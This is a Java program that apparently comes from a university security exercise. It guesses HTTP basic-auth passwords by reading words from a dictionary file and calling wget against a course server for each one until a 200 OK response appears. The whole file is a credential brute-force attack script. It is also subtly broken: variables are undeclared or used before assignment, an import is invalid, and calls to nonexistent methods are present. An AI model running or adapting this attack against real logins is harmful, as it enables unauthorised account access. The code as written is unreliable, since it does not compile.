




import java.io.*;
import java.net.*;
import java.*;
import java.util.*;

public class Dictionary
{
	public static void main( String args[])
	{
          Runtime t = Runtime.getRuntime();
	  Process pr = null;
          int count=0;
	  String f,pass,temp1;

	  
         try{  
		
		FileReader fr = new FileReader("words.txt");
		BufferedReader bfread = new BufferedReader(fr);



		while((bf = bfread.readLine()) != null)
		{
		    
                   if( f.length() < 4 ) 
		    {
                     count++;
		     System.out.println("The passowrd  tried is------>"+"-->"+count);
		     pass = f;
		     
 	
	             f ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/";
		     pr = t.exec(f);
				
		     InputStreamReader  stre = new InputStreamReader(pr.getErrorStream());
                     BufferedReader bread = new BufferedReader(stre);
		     
                         while( ( bf= bread.readLine())!= null)
			  {
                          if(bf.equals("HTTP request sent, awaiting response... 200 OK"))    
                           {
                              System.out.println("Eureka!! Eureka!!! The password has been found it is:"+pass);



                              System.exit(0);
                           } 
			
                          }
	            }
				
			
		}
			
		fr.print();
		bfread.print();
	
             }catch(IOException e){}

	}
	
}			
